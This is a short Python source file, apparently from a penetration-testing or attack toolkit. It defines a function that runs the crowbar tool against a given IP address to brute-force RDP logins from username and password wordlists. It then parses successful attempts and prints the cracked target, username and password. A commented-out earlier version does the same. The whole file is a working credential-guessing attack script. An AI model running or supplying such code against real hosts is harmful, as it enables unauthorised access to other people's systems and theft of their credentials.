import os
import re
import subprocess
from urllib.parse import unquote

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def rdpbrute_script(ip):
    command = [
        "python",
        f"{BASE_DIR}/crowbar.py",
        "-q",
        "-b",
        "rdp",
        "-U",
        f"{BASE_DIR}/wordlist/username.txt",
        "-C",
        f"{BASE_DIR}/wordlist/password.txt",
        "-s",
        f"{ip}",
    ]

    process = subprocess.Popen(
        command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
    )
    output_list = []
    for line in process.stdout:
        payload = unquote(
            line.decode("utf-8")
            .replace("[92m", "")
            .replace("[0m[94m", "")
            .replace("[0m", "")
            .strip()
        )
        if "SUCCESS" in payload:
            output = re.findall(r"[\d\.]+\:\d+\s+\-\s+\S+\:\S+", payload)[0]
            target_ip, user_pass = output.split("-")
            username, password = user_pass.strip().split(":")
            output_list.append(payload)
            yield f"target: {target_ip} - username: {username} - password: {password}\n"

        else:
            yield f"{payload}\n"

    # p = subprocess.run(
    #    command,
    #    capture_output=True,
    #    encoding="utf-8",
    # )
    # print(p.stdout)
    # ansi_escape = re.compile(r"\x1b[^m]*m")
    # output = ansi_escape.sub("", str(p.stderr)).split("\n")[1]
    # if output:
    #    output = re.findall(r"[\d\.]+\:\d+\s+\-\s+\S+\:\S+", output)[0]
    #    target_ip, user_pass = output.split("-")
    #    username, password = user_pass.strip().split(":")
    #    result = {
    #        "target_ip": target_ip.strip(),
    #        "username": username,
    #        "password": password,
    #    }
    # else:
    #    result = None


#
# return result
